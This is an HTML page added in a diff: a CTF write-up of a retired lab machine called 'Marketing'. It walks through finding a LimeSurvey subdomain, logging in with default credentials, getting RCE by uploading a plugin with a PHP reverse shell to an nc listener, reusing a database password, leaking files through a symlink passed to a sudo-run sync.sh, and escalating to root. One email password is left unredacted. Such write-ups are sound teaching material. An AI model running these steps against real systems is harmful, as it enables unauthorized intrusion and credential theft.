@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Marketing &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Marketing</h1>
+    <div class="meta">Target: <code>192.168.180.225</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Gobuster</span><span class="tag">VirtualHost</span><span class="tag">LimeSurvey</span><span class="tag">RCE</span><span class="tag">PasswordReuse</span><span class="tag">SymlinkAttack</span><span class="tag">sudo</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration-and-subdomain-discovery">Web Enumeration and Subdomain Discovery</a><a class="lvl3" href="#limesurvey-login">LimeSurvey Login</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#limesurvey-plugin-upload-rce">LimeSurvey Plugin Upload RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#www-data-to-t-miller-database-password-reuse">www-data to t.miller, Database Password Reuse</a><a class="lvl3" href="#t-miller-to-m-sander-symlink-leak-via-sync-sh">t.miller to m.sander, Symlink Leak via sync.sh</a><a class="lvl3" href="#m-sander-to-root-sudo-bash">m.sander to root, sudo bash</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Marketing requires three distinct credential chains before reaching root. A subdomain hidden in old page source leads to a LimeSurvey instance with weak default credentials and a known plugin-upload RCE. The <code>www-data</code> shell exposes a database password that one system user reuses. That user can run a <code>sync.sh</code> script as a second user, and a symlink trick leaks the second user's credentials file through the diff output. The second user is in the <code>sudo</code> group and can run bash as root directly.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: marketing.pg - Digital Marketing for you!
+</code></pre>
+<h3 id="web-enumeration-and-subdomain-discovery">Web Enumeration and Subdomain Discovery</h3>
+<p>Gobuster on the main site:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.180.225/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
+/assets               (Status: 301)
+/old                  (Status: 301)
+/vendor               (Status: 301)
+</code></pre>
+<p><code>/old</code> contained an archived version of the site. In its page source:</p>
+<pre><code class="language-html">surveys &lt;a href=&quot;//customers-survey.marketing.pg&quot;&gt;here&lt;/a&gt;
+</code></pre>
+<p>After adding <code>customers-survey.marketing.pg</code> to <code>/etc/hosts</code>, the subdomain resolved to a LimeSurvey installation.</p>
+<blockquote>
+<p><strong>Why old pages are worth reading:</strong> legacy content isn't maintained, isn't monitored, and often contains links, comments, or credentials that were removed from the live site. In this case the old page revealed an entire separate application that gobuster never found, because subdomains require virtual host brute-forcing or source review, not directory scanning.</p>
+</blockquote>
+<h3 id="limesurvey-login">LimeSurvey Login</h3>
+<p>The admin page sat at <code>/index.php/admin/authentication/sa/login</code>. The contact email <code>admin@marketing.pg</code> suggested the admin username. Common default passwords revealed the correct one: <code>admin:password</code>.</p>
+<p>The dashboard showed the version: <strong>LimeSurvey Community Edition 5.3.24</strong>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="limesurvey-plugin-upload-rce">LimeSurvey Plugin Upload RCE</h3>
+<p>LimeSurvey 5.3.24 allows admins to install plugins as zip files and contains no validation preventing a PHP shell from being included. The exploit from github.com/Y1LD1R1M-1337/Limesurvey-RCE automates the steps:</p>
+<ol>
+<li>Create a PHP reverse shell pointing to Kali:443</li>
+<li>Bundle it with a valid <code>config.xml</code> into a zip archive</li>
+<li>Upload via the Plugin Manager and install</li>
+<li>Activate the plugin from the dashboard</li>
+<li>Visit the plugin's file path to trigger execution</li>
+</ol>
+<pre><code>http://customers-survey.marketing.pg/upload/plugins/Y1LD1R1M/php-rev.php
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.225] 35770
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="www-data-to-t-miller-database-password-reuse">www-data to t.miller, Database Password Reuse</h3>
+<p>The LimeSurvey config at <code>/var/www/LimeSurvey/application/config/config.php</code> contained database credentials:</p>
+<pre><code>'username' =&gt; 'limesurvey_user',
+'password' =&gt; '‹redacted›'
+</code></pre>
+<p>These didn't authenticate to MySQL locally, but <code>su</code> with the same password worked for the system user <code>t.miller</code>:</p>
+<pre><code class="language-sh">www-data@marketing:/home$ su t.miller
+Password: ‹redacted›
+t.miller@marketing:/home$ whoami
+t.miller
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-sh">t.miller@marketing:~$ cat local.txt
+‹redacted›
+</code></pre>
+<h3 id="t-miller-to-m-sander-symlink-leak-via-sync-sh">t.miller to m.sander, Symlink Leak via sync.sh</h3>
+<p><code>sudo -l</code> as <code>t.miller</code>:</p>
+<pre><code class="language-sh">(m.sander) /usr/bin/sync.sh
+</code></pre>
+<p><code>id</code> revealed membership in group <code>119(mlocate)</code>:</p>
+<pre><code class="language-sh">uid=1000(t.miller) gid=1000(t.miller) groups=1000(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)
+</code></pre>
+<p>The <code>mlocate</code> group can read the mlocate database, which showed a file at <code>m.sander</code>'s personal directory: <code>creds-for-2022.txt</code>. Direct reads of the file were blocked by permissions, but <code>sync.sh</code> compares files with <code>diff</code> and prints the differences. A symlink pointing at the protected file would trick the script into diffing and leaking its contents.</p>
+<p>From <code>/home/t.miller</code> (required for permissions to work):</p>
+<pre><code class="language-sh">ln -sf /home/m.sander/personal/creds-for-2022.txt symlink
+sudo -u m.sander /usr/bin/sync.sh symlink
+</code></pre>
+<pre><code>Difference: 1,3c1,8
+---
+&gt; slack account:
+&gt; michael_sander@gmail.com - pa$$word@123$$4!!
+&gt;
+&gt; github:
+&gt; michael_sander@gmail.com - ‹redacted›
+&gt;
+&gt; gmail:
+&gt; michael_sander@gmail.com - ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why the symlink works:</strong> <code>sync.sh</code> opens the path it's given without checking whether it's a real file or a symlink. It follows the symlink to <code>m.sander</code>'s file and reads its contents with <code>m.sander</code>'s permissions (because it runs as <code>m.sander</code> via sudo). The diff output includes every line that differs between the two files, leaking all of <code>creds-for-2022.txt</code>.</p>
+</blockquote>
+<p>The gmail password was the SSH password for <code>m.sander</code>:</p>
+<pre><code class="language-sh">su m.sander
+Password: ‹redacted›
+m.sander@marketing:/home/t.miller$ id
+uid=1001(m.sander) gid=1001(m.sander) groups=1001(m.sander),24(cdrom),27(sudo),...
+</code></pre>
+<h3 id="m-sander-to-root-sudo-bash">m.sander to root, sudo bash</h3>
+<p><code>m.sander</code> is in the <code>sudo</code> group with full rights:</p>
+<pre><code class="language-sh">m.sander@marketing:/home/t.miller$ sudo /bin/bash
+root@marketing:/home/t.miller# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@marketing:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Source code in old/archived pages reveals infrastructure that directory scanning misses.</strong> Subdomains only show up in virtual host scans or in links within the application.</li>
+<li><strong>Config files in web app deployments routinely hold database passwords, and those passwords get reused on system accounts.</strong> Check <code>/application/config/</code>, <code>.env</code>, and <code>wp-config.php</code> as soon as you have any read access.</li>
+<li><strong>Symlinks defeat file-permission checks when a privileged script opens the path you control.</strong> If <code>sudo -u other script &lt;file&gt;</code> exists, ask whether you can replace <code>&lt;file&gt;</code> with a symlink to something the other user can read.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
